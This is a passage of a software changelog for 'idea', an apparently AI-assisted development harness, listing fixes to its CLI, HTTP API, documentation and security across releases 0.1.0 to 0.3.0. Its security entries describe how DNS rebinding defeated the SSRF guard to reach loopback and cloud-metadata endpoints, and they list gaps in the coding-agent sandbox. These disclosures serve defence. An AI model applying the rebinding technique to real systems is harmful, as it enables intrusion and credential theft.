  artifact check, because the status is `running` for the whole of every M2 and
  M3 operation and dropping it would un-complete Define mid-build.

  Fixed on **both** consumers. `ProductHome` reaches `derivePhases` through
  `rollupPhaseSource`, and `InitiativeRollup` carried no reason in the Go
  struct, the projection, the OpenAPI schema or the TS mirror — so fixing only
  `App.tsx` would have left the bug on the page that renders the rail for every
  initiative at once. A plan review caught that; the first draft named one
  consumer.

  An empty reason is treated as *not* past Define rather than falling back to
  the artifact check. Migration 18 backfills nothing, so every pre-migration
  park carries `''` whichever path parked it — including `plan_dependencies`,
  whose artifact is present — and the fallback would have re-run the wrong
  inference on exactly the population it is wrong for.

- **`scripts/ci-test-summary.py` reported success over a run that never
  finished.** It failed only on an `action == "fail"` event carrying a `Test`.
  Measured on go1.25.5, three of the four ways a run dies emit no such event: a
  compile error, a panic in `TestMain`, and a panic in a background goroutine
  that takes the binary down mid-test. Only a panic *inside* a test was caught.
  So the macOS job could go green while printing `All tests passed (0 package(s)
  with tests).`

  Every failing shape emits a package-scoped `fail` with no `Test`, and the
  script already discriminated on exactly that shape for the *pass* case and had
  no `fail` counterpart. It has one now, plus `build-fail`, plus the `go test`
  exit status for the case no event can describe: an empty file, a non-JSON
  file, or a stream cut mid-run, each of which the script answered `All tests
  passed (0 package(s) with tests)`. Five fixtures captured from real runs pin
  the event shapes, and `ci.yml` passes the status through `|| status=$?` rather
  than `continue-on-error`, which would swallow it.

  This mattered before the release gated on that job: a gate that can be green
  on a panic is weaker than it looks.

- **The web UI rendered a frozen `v0.1.0`.** `HealthPage` fell back to that
  literal whenever `/health` had not resolved, so a page loading against a v0.3.0
  daemon showed a version three releases old as though it were the running build
  — `info.version`'s defect, user-visible. It shows an em dash now, which is
  what is true.

- **The other two judgment reasons are exercised end to end.**
  `demo.block_plan_review_cycles` and `demo.dangle_plan_dependency` make the
  demo provider produce a blocked plan review and a plan with a dependency no
  task provides, so `scripts/smoke.sh` now drives all four `needs_human_judgment`
  reasons — in one initiative that still reaches `✓ initiative complete`.

  The plan review also got its own fake-provider queue key. All three adversarial
  reviews shared one, so a queued response could outlive the review it was meant
  for and land on the **change-set** review, where a blocking finding cannot be
  cleared by anything the CLI can do. The name is a demo discriminator only —
  real providers send the schema body — so separating them costs nothing and
  retires that hazard.

- **The demo provider can be told to block a review, and `scripts/smoke.sh`
  now drives the human-judgment branch on every push.** `demo.block_review_cycles`
  in `.idea-harness/harness.yaml` makes the built-in provider's adversarial
  reviewer emit a blocking finding for that many calls.

  The reviewer returned `{"findings":[]}` unconditionally, so the review loop
  always converged and `needs_human_judgment` was **structurally unreachable**
  on the only path CI, the smoke script and six DX audits ever ran. That is how
  a P0 failing 4/4 runs of the README's own quick start survived six rounds, and
  why nothing would have caught the `idea approve` defect above — the new smoke
  pass reproduces it exactly (`initiative has open blocking findings; cannot
  complete`) when the fix is reverted.

  A count consumed from a queue, not a flag: all three adversarial reviews share
  one schema name, and a blocking finding on a *change set* cannot be cleared by
  anything the CLI can do.

- **Two step-by-step demo guides, linked from the README.**
  [`docs/demo-greenfield.md`](docs/demo-greenfield.md) walks an empty directory to a verified,
  complete initiative; [`docs/demo-existing-project.md`](docs/demo-existing-project.md) points the
  same loop at a repository that already has code. Neither needs an API key.

  The existing-project path had never been exercised — no script, test or document ran `idea init`
  inside a directory that already had files, and both the README quick start and the quickstart
  begin with `mkdir`. Writing it turned up three things worth stating plainly, all verified by
  running them: `idea docs add` fails before an initiative exists, so grounding on your own source
  goes through `idea new --doc`; the default executor writes a placeholder and leaves existing
  files byte-identical, which the guide has the reader confirm with `md5` rather than assert; and
  `.idea-harness/` lands untracked, holding portable config worth committing while runtime state
  stays outside the repo.

- **A response-schema guard.** Three guards already compared routes to the spec, request-body field
  names to handlers, and spec enums to domain constants; none looked at what a response actually
  contains. That is why `Coverage.status` was returned for months and documented nowhere,
  `RequirementStatus` listed four of six values, and `/doctor` and `/diff` answered `null` where the
  spec says `array` — each found by a human reading, one at a time. A daemon test now parses
  `openapi.yaml` and validates every reachable `GET` response against its declared schema: required
  fields present, array-typed fields not null. 65 responses across a populated and a bare fixture.

- **`openai/gpt-5.6-luna` and `anthropic/claude-sonnet-4-5-20250929` are in the
  bundled model catalog**, so `idea model set` no longer warns on either.
  `gpt-5.6-luna` is the model this project runs on and the one `README.md` and
  `docs/quickstart.md` put on the front page, and it warned on every run.

  The catalog feeds `GET /providers`'s `models`, `idea model ls`'s fallback list
  and the `idea model set` warning, so this is a visible response change.
  `DefaultModelFor("anthropic")` also moves to the dated id: it leads the row
  deliberately, being the only anthropic entry the provider's own `/v1/models`
  returns. The openai row is appended to, leaving its default at `gpt-4o` —
  changing a default that six releases have shipped is a separate decision from
  fixing a warning, and this entry is the latter.

  Nothing was removed. The four undated anthropic ids are absent from the live
  listing, but a listing omits aliases by construction and a direct probe could
  not settle it (every id returned `400 credit balance is too low`, because
  billing is checked before the model name), so removing them on an unproven
  claim would also have broken `internal/config/catalog_warning_test.go`. That
  contradiction is recorded in `docs/plans/deferred.md` as audit 8 / E6.

- **`idea approve-plan` succeeded and left the initiative unable to finish.**
  A plan review that blocked once and passed on a later run kept its blocking
  findings open — `runExecutionPlanReview` set the status and dispositioned
  nothing — so the completion gate refused forever, and no CLI command could
  clear them: `revise-plan` and `reopen-phase` both refuse once a change set
  exists, and `approve` refuses any reason but `prd_review`.

  The identical omission was fixed twice on the PRD path already. One rule,
  third instance: whatever clears a review owns the findings it cleared.

  It was invisible to the census test that pins which *reason* gets written,
  because that test cannot see what happens after. `scripts/smoke.sh` now drives
  the plan-review escape through `approve-plan` specifically and reproduces the
  defect verbatim when the fix is reverted — `initiative has open blocking
  findings; cannot complete`.

  `approve-plan` is also gated now, on the judgment reason and on change sets.
  All four reasons share one status, so accepting on status alone let it approve
  a plan parked on `plan_dependencies` — where the *undisposed* finding **is**
  the guard that keeps a dependency graph known to be incomplete out of
  `complete`. The first version of this fix did exactly that, and swept an
  already-building initiative's change-set findings besides. The gates are
  synchronous, in the Runtime: raised inside the launched operation they failed
  the initiative rather than declining the request.

- **Six documentation claims that were false against the code.** All verified by
  reading the source they describe, not by rereading the prose:

  - `ui.md` said "every screen refreshes on a 2.5-second timer". Five do not
    poll at all — Health, Decision, the doc reader, the artifact diff and
    Settings load once and go stale until reload. The cited literal was also
    wrong for `App.tsx`, which uses an inline closure.
  - `ui.md` defined demo mode as "no `providers:` entry and none of the known
    key variables set". `isDemo` consults neither: it is
    `defaultProviderName(cfg) == demoProviderName`. The old wording was wrong in
    both directions — a key with no `default_model` is still demo mode, and a
    `default_model` you have no key for is not.
  - `api-reference-hosting.md` said `make api-check` "compares paths only". It
    has three axes now. The sentence's actual point — that nothing reads
    `info.version` — is true and is now what it says.
  - `idea retry` was explained nowhere outside the generated command table,
    including in the two places that describe an initiative reaching `failed`.
  - Nothing said which initiative a bare command acts on. It is the most
    recently *created* one — not the last touched, and not one you selected.
  - `--json` was described as the command's response "and nothing else", which
    reads as parity with the rendered form. It is the wire response:
    `idea status --json` carries three fields while the rendered form composes
    counts and guidance from other endpoints.

  Each has a ledger row with a predicate, and each predicate was mutation-checked
  in the direction that row watches — three of them are `present:` rows that fire
  when the old text returns, and my first pass tested the wrong direction and
  read as passing.

- **Eight output blocks in the two demo guides showed something the binary does
  not print.** `idea status` showed two of six lines; `idea apply` and `idea
  revert` omitted their cancel hints; `idea verify` omitted its first line;
  `idea revert` had no block at all in one guide and only its `git status` half
  in the other; `idea new` omitted the demo banner one guide shows for the same
  command; `idea docs` showed a three-line excerpt where the binary dumps 200
  characters of the file; the executor warning was hand-wrapped over two lines
  in both guides; and `idea next --until-human` was shown running one step when
  it runs two.

  These are the guides the README tells everyone to start with. I wrote them
  last round, verified their *behavioural* claims by running them, and typed the
  output blocks by hand. Every one above was found by running the documented
  sequence and diffing.

  Guarded from both sides now, without new machinery: `absent:` rows in the
  audit-6 ledger catch a re-edit that drops these lines, and `scripts/smoke.sh`
  — which already runs both sequences — checks that lines the binary prints
  still appear in the guides, which is the direction a ledger predicate cannot
  see. A general block-diffing guard was designed, reviewed twice and rejected
  on cost; the reasoning is in `deferred.md` as `audit 6 / G5b`.

- **`idea doctor` exited 0 outside a project even when the daemon was
  unreachable to it.** The no-project branch returned success unconditionally,
  so a rejected token — or now a stale daemon — was reported and then exited 0.
  That branch is where the README puts `idea doctor`, immediately after the
  install block, which is exactly where an upgrade is verified.

- **Every test using the CLI's fake daemon ran with `tokenRejected` silently
  true.** The fake served `/api/v1/health` but not `/api/v1/version`, which is
  what `authAccepted()` asks for, so the check failed in every test and a whole
  diagnostic branch fired underneath a green suite.

- **`idea approve` produced an initiative that could never complete.** It moved
  the status and approved the requirements, and left every blocking finding
  undisposed — while `hasOpenBlockingFindings` refuses `complete` while any
  undisposed critical/high exists, and no CLI command can disposition one. So
  the command shipped as the way out of a non-converged PRD review moved the
  failure from `idea review CHG-1` to `idea verify`, one step further along.
  Its own doc comment said "accepted as it stands, findings and all"; that is
  true now. They are recorded as `accepted_risk`, the one disposition the
  reviewer is forbidden to set, so it reads as a human's signature rather than
  a claim that anything was fixed.

  `approve` also now refuses an initiative parked for any reason but a stalled
  PRD review, answering **409**. All four reasons share one status, so a
  status-only gate would have let it sign off findings the human was never
  shown — worst of all the `plan_dependency` finding, whose *undisposed* state
  is the guard that keeps a dependency graph known to be incomplete out of
  `complete`.

- **A wrong verb answers `405` with an `Allow` header, not `404`.** Go synthesizes `405` only when
  no route pattern matches, and the web UI handler registered for `/` matched everything — so the
  branch was dead and a mistyped path was indistinguishable from a mistyped method.

## [0.3.0] - 2026-09-04

Guards and ergonomics. No P0s — 0.2.0 is safe to stay on; this exists so the published artifact
does not drift behind `main` the way 0.1.0 did for four audit rounds.

**A minor bump, not a patch.** Two response shapes change, and they are the same class 0.2.0 listed
under **Changed — BREAKING (HTTP API)** — so by this project's own precedent they belong in a minor
release. A client that null-checked keeps working, and one generated from `openapi.yaml` now works
where it did not, but the convention is what decides the number rather than how compatible the
change happens to be.

### Added

- **`idea <command> --help` works on every command.** `--help` and `-h` were rejected as unknown
  flags on all 33 subcommands, so there was no way to learn what `idea verify --waive` does or what
  kinds `idea export` takes without opening `docs/cli.md`. Rendered from the same command table
  that drives `idea help` and the docs, so the three cannot disagree. Arguments after `--` are left
  alone: `idea docs add -- --help` still adds a file named `--help`.
- Recorded wire-format goldens for the three providers, plus an assertion that the token budget a
  provider emits never exceeds the ceiling it declares. Four rounds of guards compared artifacts to
  artifacts; nothing compared the request to what a provider accepts, which is how the token-budget
  P0 survived until someone spent a real API key. The cap now also exists inside each provider, so
  no caller can emit a request the provider will reject.

### Fixed

- Unmatched paths under `/api/` answer the documented `{"error": …}` envelope. `openapi.yaml` said
  every error has that shape "and nothing else"; the web UI handler is registered for `/`, so a
  wrong verb or a typo'd path fell through to `404 page not found` as `text/plain`. Ten API paths
  answered that way, and the CLI surfaced it as `idea: 404 Not Found` — the only raw HTTP status it
  prints.
- `/doctor` and `/diff` no longer emit `null` for empty arrays. The previous sweep converted eight
  fields and missed these two, so the API had become *mixed* rather than consistent — `/diff` could
  return `"added":[{…}],"removed":null` in one response. `/doctor` was the worse case: an empty
  finding list means the graph audit found nothing wrong, so the good outcome was the one returning
  `null`.

## [0.2.0] - 2026-09-04

Five developer-experience audits and their remediation. **0.1.0 contained every P0 fixed below**,
so upgrading is strongly recommended over pinning to it.

This release is breaking in the ways listed under the BREAKING headings: several commands that
exited 0 on failure now exit non-zero, a handful of HTTP status codes and response shapes changed,
and empty arrays are `[]` rather than `null`. Pre-1.0, per the versioning note above, those land in
a minor release; each entry states the consumer impact.

A second developer-experience audit of the published 0.1.0 returned FAIL at 70/100, with both hard
gates passing. Nearly every finding was one instance of the same failure: a fix made correctly in
one place and not propagated to its siblings. So the fixes below are structural where a defect class
existed, and each new guard checks a second axis.

A third audit of the same tree returned FAIL at 74/100. Its pattern was one level out: the
remediation corrected each canonical source and left the derivative copies stale, and the security
review of its fix plan then found two exploitable defects in the credential path that no audit had
looked for. Those go first below, because a wrong security document is how somebody points this at
a repository they should not.

A fourth audit returned FAIL at 79/100. Its pattern was the correction reaching two of three
documents — and its P0 was a state-machine hole no guard could see. Three adversarial reviews of
the remediation then found a security defect neither audit had looked for, two contract bugs, and
several guards that could not reach their own findings; those are recorded below alongside the
findings they were meant to catch.

A fifth audit returned FAIL at 61/100 with the magic-path gate broken. The score fell because
this round did two things no previous one had: it ran the README's block **verbatim on the no-key
path**, and it made **real provider calls**. Every P0 it found had shipped in 0.1.0 and three date
to the initial commit — four rounds of guards had compared artifacts to artifacts, and nothing
compared the product to a provider or executed the documented sequence as written.

### Fixed — the documented first run (P0)

- **`idea new` waits for the run it starts.** It received the operation id and discarded it, so it
  returned while the workflow was still going. That made the README's own eight-command quick start
  a race: the next command saw the initiative `running`, `idea next --until-human` fell through to
  "workflow running — try `idea watch`" without doing anything, and the block went on to print
  `✓ initiative complete` over an initiative with **zero change sets and no file written**.
  Measured back-to-back with no provider keys: 0 of 5 runs passed before, 5 of 5 after. With keys
  exported it passed 5 of 5 either way — ambient keys shifted the timing enough to win the race,
  which is why four audits and a passing smoke test never saw it. `--no-wait` keeps the
  fire-and-forget shape, and a failed run is now a non-zero exit rather than a silent success.

- **Stage token budgets are capped to what the provider says it can produce.** `maxOutputForStage`
  asked 32000 tokens for the PRD stage, four lines beneath a comment asserting its values "stay
  within the providers' declared MaxOutput ceilings (16k for Anthropic/OpenAI)". Nothing compared
  the two — `Capabilities.MaxOutput` was declared per provider and read nowhere — so the README's
  own worked example (`openai/gpt-4o-mini`) failed on **every** run with a non-retryable 400. A
  provider declaring 0 has stated no ceiling and is left alone, so custom OpenAI-compatible
  endpoints are unaffected.

- **Truncation is detected instead of absorbed.** Capping alone would have traded a loud 400 for a
  silently shorter artifact: `repairJSON` closes unterminated containers and the review schema has
  no `minItems`, so an adversarial review cut from 15 findings to 1 validates clean. Each provider
  now reports its own finish reason (`length`, `max_tokens`, `MAX_TOKENS`) as an error naming the
  budget that was hit.

- **`idea retry` exists.** Four comments in the daemon named it as the recovery path for a stranded
  or failed run. It had never been a command — the route and the runtime method were there and only
  the CLI entry was missing. It defaults to the configured model and takes `--model` to retry
  against a different one.

### Fixed — configuration (P0)

- **`idea model set` no longer reverts hand edits.** It assembled its write from the daemon's
  cached config, which is read once at start, and wrote the whole file back — so anything edited
  since silently reverted, at exit 0, by a command the documentation recommends. Observed:
  `review.max_cycles` 9 → 3, `research.urls` emptied, `git_commit` true → false. The sibling
  executor handler had always re-read from disk and said why; the two sat 1800 lines apart and only
  one was right.

- **A model id with no provider is refused when nothing would resolve it.** `idea model set gpt-4o`
  was accepted by `model set`, `config validate` and `doctor`, all exit 0, and with a provider key
  exported the demo banner was suppressed — so the whole workflow ran on the built-in stub while
  the user believed gpt-4o had written their PRD. It is now an error when no default provider
  exists and a warning when one does, because `models.critic: gpt-4o` beside a qualified
  `default_model` is a legitimate form. Separately, the demo banner now asks the question the
  registry asks rather than scanning for key environment variables, so synthetic output cannot be
  reported as real.

- **`idea version` no longer reports a version that does not exist.** A build from a checkout
  claimed Go's module pseudo-version — `v0.1.1-0.20260904033502-…`, one patch above the only
  release, never tagged, and outranking the real version in a bug report — while the documented
  `dev (sha, dirty)` form was unreachable. A module version is now trusted only when there is no
  VCS data, which is the one path (`go install <module>@<version>`) that produces one meaningfully.

- Provider errors carry the response body that explains them, bounded and scrubbed for anything
  credential-shaped. `openai: status 400` was the message for every OpenAI failure, and the body it
  discarded named the cause exactly — which is why the token-budget defect above survived four
  audits.

### Fixed — the initiative claim (P0)

- **A successful `idea execute` stranded the initiative in `running` forever.** The claim added in
  the previous round released only on the error path, so `idea next` answered "workflow running"
  indefinitely and every later command answered "already running", with no way back short of
  editing the database. Every gate stayed green: `scripts/smoke.sh` and the audit journey both
  revert afterwards, and `RevertChangeSet` happens to reset the status one step after the bug
  corrupts it.
- **Apply and revert now take the claim too**, from every non-running state, so a concurrent
  `revise` can no longer supersede requirements while an apply lands. A request that arrives while
  one is running gets a `409` naming the state instead of interleaving.
- **A panic after a run had already finished no longer rewrites the record.** `failOperationAfterPanic`
  wrote `failed` unconditionally, so a panic in a deferred cleanup turned a succeeded operation into
  a failed one — and the two writes it made were gated on different conditions, so it could also
  leave the operation failed and the initiative untouched.
- **Reverting a change set from `complete` lands on `plan_approved`.** The revert releases the claim
  to the status the engine chose rather than the one captured before it, so a rolled-back initiative
  is no longer reported as finished.
- **`failure_reason` survives a claim.** Apply and revert claim from `failed` and release back to
  it; both writes cleared the reason, so an initiative could be reported as failed with no
  explanation at all.
- The nine async entry points are now enumerated from the AST, with each one's claim status checked
  against the code rather than described in prose.

### Fixed — security

- **The `sk-` credential pattern missed 27–30% of every modern key shape.** Provider key bodies are
  base64url; the pattern's body class was alphanumeric, so a `_` or `-` in the first 16 characters
  of the body broke the match and the key passed every choke point — blobs, events, context bundles
  — in the clear. Measured over random base64url bodies rather than estimated. This is the second
  correction to this pattern: the first widening fixed the prefix and left the body wrong.
- **The idea text is redacted before it reaches the model provider.** It was passed raw.

Both of these were found by an adversarial security review of the *third* audit's fix plan, not by
either audit: three audits of route sets, request-body fields and 409 declarations were green while
they stood.

- **Modern provider API keys were never redacted.** The credential catalog's `sk-` pattern required
  20 or more contiguous alphanumerics immediately after the prefix, so it matched only the legacy
  flat OpenAI key. Every current format puts a hyphen inside the first few characters —
  Anthropic's `sk-ant-api03-…`, OpenAI's `sk-proj-…` and `sk-svcacct-…` — and all three passed
  through every choke point unredacted: blobs, events, context bundles. Anthropic is a first-class
  provider here and its key is the credential forwarded into the sandboxed agent container, which
  has unrestricted network egress. Measured before the fix: three of four modern formats not
  redacted.
- **The SSRF guard could be defeated by DNS rebinding.** The research fetcher resolved the URL's
  host, checked every returned address was public, and then dialled the original `host:port` — which
  Go's dialer resolves a *second* time. A DNS server the URL's owner controls answers public on the
  first lookup and `127.0.0.1` or `169.254.169.254` on the second, reaching exactly the loopback and
  cloud-metadata endpoints the check exists to block. It now dials the address it just validated.
  URLs reach the fetcher from `harness.yaml`'s `research.urls`, so a cloned or shared project could
  carry the hostile name. The regression test asserts the address the inner dialer receives, because
  a test that counts resolver calls cannot see this bug at all.

### Fixed — security documentation

- `docs/security-model.md`'s "Execution gateway" described isolation the coding agent does not get.
  Its list — no network, `--cap-drop ALL`, non-root, a read-only `/repo` mount — belongs to
  `ContainerSandbox`, whose only non-test caller is the deterministic build/test check. The
  executors that run model-generated code build a different argv: no `--network` flag at all, the
  workspace mounted read-write at `/work`, and the provider API key inside the container. The
  section is now a table of all four selectable executor kinds against their real argv — including
  `internal`, the default, which runs in the daemon process with no container at all — and the page
  gains a **"What this does not protect against"** section for the negative space: unrestricted
  egress, the redaction-free raw store, unredacted image egress, `--user` passing the daemon's own
  UID so a root daemon yields a root container, an image pinned by tag rather than digest, and a
  control-plane deny that does not cover `.github/workflows/`.
- `slog` is no longer listed as a redaction choke point. There is no redacting log handler and
  `GET /api/v1/logs` returns `daemon.log` verbatim; `docs/security.md` says so instead.
- `docs/security.md` no longer claims `human_approved` "requires a recorded human action" or that
  `reviewed_agent_output` "requires a distinct reviewer run". `security.TrustFor` reads no records —
  it maps a selector string to a level. Three of the six levels have no caller that emits them, and
  a trust level is consumed by exactly one line of code, the untrusted-data prompt wrapper: it is
  prompt hygiene, not authorization, and the page now says that.
- The claim that change-set file contents are "redacted at write time" is inverted, and was in two
  published artifacts: `docs/api.md` and `docs/openapi.yaml`. Redaction happens at the read/display
  surface; the raw blob store is deliberately redaction-free so apply and revert round-trip
  byte-for-byte. Both now state it that way and link to the one canonical statement rather than
  restating the mechanism a third time.

### Fixed — BREAKING (HTTP API)

- `GET /projects/{p}/initiatives/{i}/risk` no longer writes. It called an append-only store method,
  so every read added a row *and* an event that the activity feed returns and the SSE stream
  carries — the UI polling its risk panel, or `idea risk --json` in a reporting script, grew the
  database without bound. Nothing ever read those rows back; the profile is recomputed per request,
  which it always could have been.
- `POST …/change-sets/{id}/revert` returns `409` with the blocking status instead of `202` when the
  change set is not `applied`. `idea revert CHG-1` on an already-reverted change set used to print
  "✓ revert started" and exit 0, with the real failure only in the daemon log. `POST …/execute` now
  likewise requires an approved plan.
- `POST …/advance` and `POST …/revise` return `409` rather than `500` for precondition failures such
  as "initiative is already running", matching the four sibling endpoints that always did.
  Preconditions now carry a type, so a handler cannot report one as a server fault.
- The ten initiative routes registered under `{initiativeId}` are registered under `{id}`, so every
  initiative-scoped route names its path parameter the same way. Path *values* are unchanged; this
  is visible only in `openapi.yaml` and to generated clients.
- Executor config: when the file is written but the reload fails, the response is a `409` naming
  that state instead of an error string containing an absolute state path.
- Setting a disposition or a note on a finding that does not exist returns `404` instead of `200`.
  The update matched no row and reported success, and the provenance event was written regardless —
  so the record showed a human dispositioning a finding that was never there. `idea review resolve`
  on a mistyped id printed a checkmark.

### Fixed — CLI

- **Unknown flags are an error on every command.** Ten commands ignored them: `idea status --jsonn`
  printed human output to stdout and exited 0, breaking any downstream `jq`, and `idea logs -n 200`
  silently showed the default 50 lines. Unknown *subcommands* are errors too — `idea daemon stauts`
  used to start a second daemon in the foreground, and `idea config valdiate` printed the model list
  and exited 0.
- `idea docs add -` reads from stdin, as README, `docs/ui.md`, the usage string and the quickstart's
  copy-paste line have always said. The shared parser had the carve-out for it; this command rolled
  its own loop and rejected `-` before reaching it.
- **BREAKING: `idea verify` exits non-zero when the gate is unmet.** It reported the *initiative's*
  status, not the gate's, so it exited 0 whatever the gate said — including on a requirement the
  user had just recorded as failing. Any script that branched on its exit code saw success
  unconditionally, and any script that relied on that will now stop. `idea next --until-human`
  still treats an unmet gate as the human judgment point it is and stops cleanly; only the
  standalone command fails.
- `idea verify` rejects a disposition with no requirement, and rejects two dispositions at once.
  `idea verify --pass --note "checked manually"` used to print "✓ verified" and record nothing, so a
  user believed they had signed off.
- `idea model add` rejects misspelled flags rather than dropping them, and refuses a provider with
  neither `--type` nor `--base-url` — which previously wrote a provider with no endpoint and
  reported success.
- `idea doctor` no longer claims "✓ config valid" and "all checks passed" in a directory with no
  project. Outside a project it reports the install and says there is none, and exits 0 — README
  puts it under "Verify:" before the quick start, so the documented post-install check runs exactly
  there.
- `idea init <dir>` initializes that directory instead of silently initializing the current one.
- `idea watch` stops on a not-found initiative rather than polling forever and exiting 0.
- `idea daemon status` exits non-zero when the daemon is not running.

### Changed — BREAKING (HTTP API)

- **Empty arrays are `[]`, not `null`.** Ten response fields marshalled `null` when their collection
  was empty — `/why`, `/impact`, `/models`, `/risk`'s `signals`, understanding's five, and the
  nested views' `acceptance_criteria`, `options` and `dissents`. A client generated from
  `openapi.yaml`, which types them as arrays, rejected those responses. A client that null-checked
  them keeps working.
- `POST …/change-sets/{id}/review` documents the verdicts it actually accepts. `openapi.yaml`
  declared `approve` and `reject`, which the engine has never taken — it takes `approved` and
  `rejected` — so a client generated from the spec could not approve or reject a change set at all.
  The CLI accepts the short forms and maps them, which is how the spec came to document the CLI's
  vocabulary instead of the API's.
- `RequirementStatus` gains `failed` and `waived` in the spec. Both have been emitted since human
  evidence landed and neither was declared, so a generated client rejected a valid response.

### Added — CLI

- `idea model set` and `idea executors setup` warn when the model id is absent from the bundled
  catalog. Setting one that resolves to nothing used to print a checkmark and fail on the first
  model call with a non-retryable `404`; nine such ids had shipped in the documentation. The
  executor path matters most, because that id is forwarded into the agent container, where the 404
  looks like an agent that produced nothing.
- `idea model set` also warns when your shell has the provider key and the daemon does not. The
  daemon reads the environment once, at start, and `idea init` starts it — so a key exported
  afterwards is invisible to it, and the documented order walked readers into exactly that.
  `PUT /providers` and `PUT /executors` return these as a `warnings` array.

### Added — drift guards

- `make api-docs-check` fails when a registered route has no row in `docs/api.md`. The document said
  "71 routes" while 81 were registered, and both existing guards stayed green: `api-check` compares
  routes to `openapi.yaml`, and the spec was correct. `make api-docs` adds a row per missing route.
- `make api-check` also compares each handler's decoded request-body fields against the operation's
  documented properties. That gap is how `idea verify --fail` and `--waive` shipped implemented,
  accepted by the daemon, and documented nowhere.
- The generated CLI table in `docs/cli.md` carries a **Flags** column rendered from each command's
  flag spec, so a flag that exists in code cannot be missing from the reference.
- `make docs-lint` fails on a documented command that is not a real command and on a `TYPE-n`
  reference that does not resolve. Both classes had shipped: prose invented verbs the CLI has never
  had, and identifiers pointed at rows that no longer existed. It covers README and every file in
  `docs/`, both fence styles, fenced blocks inside blockquotes, and inline code spans — each of
  those was a blind spot in an earlier version, and the wider scope immediately found a stale
  `idea revise` in `configuration.md`, a verb the CLI has never had. (`docs/plans/` is excluded:
  those are records of what was true at the time.)
- `make ledger-check` evaluates every defect-ledger row against the tree. Each row carries a
  predicate that is true exactly when its defect is present, so the check fails in both directions:
  a row marked open whose defect is gone, and a row marked fixed whose defect returned. It also
  cross-references each plan's "Mechanically checked:" list against `deferred.md`. The previous
  round's ledger had all 27 rows marked open while 21 were already fixed, and its plan claimed five
  items `deferred.md` recorded as not attempted.
- `make enum-check` compares every named string enum in `openapi.yaml` against the domain constants
  of the same name. Two enums had drifted; the three route-level guards were green through both,
  because they compare paths and field names and nothing compared a value vocabulary.
- `idea help` has a golden test. Its stability was asserted only in a comment.

### Added

- `LICENSE` — Apache-2.0, also shipped inside the release archive.
- CI runs the macOS job on both `darwin/arm64` and `darwin/amd64`. The four release binaries do not
  share a persistence layer: `modernc.org/sqlite` vendors a machine-translated SQLite per
  GOOS/GOARCH, so two shipped binaries had never run a test. README now states which platforms are
  built versus tested.

### Fixed — documentation

- `docs/api.md` documents all 81 routes, and describes `409` by cause rather than naming one of
  fifteen sources.
- `docs/architecture.md` no longer claims "no source mutation" (apply writes to the tree, through
  an approved, revertible journal) or that OpenAPI is "planned".
- `docs/security.md` records that `GET /api/v1/health` is exempt from the token, drops a
  "deferred to M3" list describing five features that shipped, and gains a threat-table row for the
  control-plane deny. `docs/security-model.md` is linked from README; both pages now say that
  *trust levels* (content provenance) and *executor trust tiers* (capabilities) are different
  mechanisms whose names both match the code.
- `docs/configuration.md` gives the real `executor.image` default.
- The reference documents no longer disagree with the handlers they describe. `docs/api.md` had a
  documented impact-counts call that returns `400` (the required `nodes` parameter was missing),
  retry's `model` marked optional when it is required, promote producing "a requirement, decision or
  question" when it only ever produces a Question, `/raw` called "the same body" as `/body` when
  `/body` is sanitized and `/raw` is not, a citation of `projection.BuildNextMove`, which is now
  `BuildGuidance`, `artifacts/diff` called a "structured diff" when it is a unified line
  diff, the initiative `/diff` described as diffing artifact versions when it reads the graph,
  "three cases" for `writeErr` when there are four, and a doc-upload row omitting `.gif`/`.webp`.
  `docs/openapi.yaml`'s change-set diff schema was missing the `files` key the handler has always
  written. Every one of these sat behind green `api-check` and `api-docs-check` runs: both compare
  route sets, neither reads prose.
- `docs/configuration.md` states what the three review budgets each bound, because they bound
  different things: `max_cycles` is review passes in the M1 loop (and `0` is not unlimited — the
  engine rewrites any non-positive value to 3), `max_tokens` is a ceiling on one response's output
  tokens, and only `max_cost_usd` is a cumulative spend ceiling.
- `docs/agents.md` no longer says the coding agent's provider key may come from the project `.env`.
  The executor reads the variable from the daemon's own process environment; a key that lives only
  in `.env` reaches the harness's own model calls and never reaches the container.

## [0.1.0] - 2026-09-03

First release. Everything below shipped in it: the tag was cut, held as an
unpublished draft while the API was unified, and re-cut so the first version
anyone can install is the one with a single addressing convention rather than
the two it started with.

### Changed — BREAKING (HTTP API)

Breaking relative to pre-release builds of `main`, not to any published version: this is the first
release, and the shape below is the one it ships with. That is why the tag was re-cut rather than
published as first drafted — publishing the old shape would have made this a migration users owed
instead of a change that cost nothing.

- Ten initiative-scoped reads moved from the flat `?initiative_id=` form to the nested path, so the
  API now has one addressing convention instead of two:

  ```text
  GET /projects/{projectId}/requirements?initiative_id=X   →  removed (404)
  GET /projects/{projectId}/initiatives/X/requirements     →  use this
  ```

  Affected: `requirements`, `assertions`, `artifacts`, `decisions`, `questions`, `findings`,
  `change-sets`, `suggested-answers`, `risk`, `doctor`. Resources addressed by their own id
  (`change-sets/{id}/apply`, `artifacts/{id}/raw`, …) and genuinely project-scoped routes
  (`providers`, `models`, `executors`) are unchanged.

  The initiative is now a required path segment. Omitting it used to be legal and made the daemon
  pick one for you — invisible in a single-initiative project, a silent wrong answer in any other.
  A stale `?initiative_id=` on a nested URL is ignored.

- `GET /initiatives/{id}/next-move` is now `GET /initiatives/{id}/guidance`. The response is
  unchanged. `/next` and `/next-move` read as variants of one endpoint and are not: `/next` returns
  a machine-executable command token and is change-set aware, while this one returns display copy
  and is change-set blind, so the two can legitimately disagree.

- `idea decisions` and `idea reviews` take an optional initiative argument, like `idea tasks`. In a
  project with no initiative they now say `no initiatives yet; run \`idea new\` first` instead of the
  daemon's `no initiatives in project`.

### Added

- The API reference can be hosted away from the binary. `APIDOCS=0 make build` drops it and 3.69 MiB
  (33.99 MiB → 30.30 MiB); the spec stays embedded either way, so a stripped binary still describes
  itself at `/openapi.yaml`. `make api-docs-dist` produces a static bundle, and
  `scripts/publish-api-docs.sh <cloudflare|aws|fastly> [--dry-run]` publishes it. See
  `docs/api-reference-hosting.md`.
- `make api-check` now runs in CI. It has caught three endpoints added by other work in progress and
  previously only ran when someone remembered to type it.

- `docs/openapi.yaml` — an OpenAPI 3.1 description of every operation, and `make api-check`, which
  fails when a route exists that the spec does not document or the reverse.
- A running daemon serves the spec and a rendered API reference without a token, outside `/api/`:
  `http://127.0.0.1:8787/openapi.yaml` and `/api-reference`.


- CI builds, vets, tests and smoke-tests on macOS as well as Linux. Nothing in the codebase branches
  on the operating system, so the differences that matter are filesystem semantics — case
  sensitivity, symlink resolution — which is exactly where the path guard and the change-set deny
  live. A case-sensitivity bypass in that deny reached a release before this job existed.
